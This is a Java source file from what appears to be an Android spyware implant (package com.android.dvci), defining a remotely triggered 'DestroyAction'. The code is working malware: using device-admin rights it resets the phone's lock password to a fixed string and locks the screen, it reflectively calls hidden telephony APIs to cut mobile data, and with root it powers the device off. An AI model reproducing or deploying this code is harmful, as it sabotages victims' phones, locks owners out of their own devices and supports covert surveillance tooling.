package com.android.dvci.action;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.telephony.TelephonyManager;

import com.android.dvci.Status;
import com.android.dvci.Trigger;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfAction;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.internal.telephony.ITelephony;
import com.android.mm.M;

public class DestroyAction extends SubAction {
	private static final String TAG = "DestroyAction";
	private boolean permanent;

	public DestroyAction(ConfAction params) {
		super(params);
	}

	@Override
	protected boolean parse(ConfAction conf) {
		try {
			permanent = conf.getBoolean(M.e("permanent"));
		} catch (ConfigurationException e) {
			return false;
		}
		return true;
	}

	@Override
	public boolean execute(Trigger trigger) {
		try {

			if (Status.self().haveAdmin()) {
				destroyAdmin();
			}
			
			if (Status.self().haveRoot()) {
				destroyRoot();
			}
			

			destroyUser();
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (execute) Error: " + ex);
			}
		}
		return true;
	}

	private void destroyUser() {
		TelephonyManager tm = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);

		Class c;
		try {
			c = Class.forName(tm.getClass().getName());
			Method m = c.getDeclaredMethod("getITelephony");
			m.setAccessible(true);
			ITelephony telephonyService = (ITelephony) m.invoke(tm);

			telephonyService.disableDataConnectivity();

		} catch (Exception e) {

			e.printStackTrace();
		}

	}

	private void destroyAdmin() {
		DevicePolicyManager mDPM;

		mDPM = (DevicePolicyManager) Status.self().getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
		
		if(Cfg.DEBUG){
			mDPM.resetPassword(M.e("Blocked0011"), 0);
		}else{
			mDPM.resetPassword(M.e("b"), 0);
		}
		mDPM.lockNow();
	}

	private void destroyRoot() {
		Execute.executeRoot("reboot -p");
	}

}
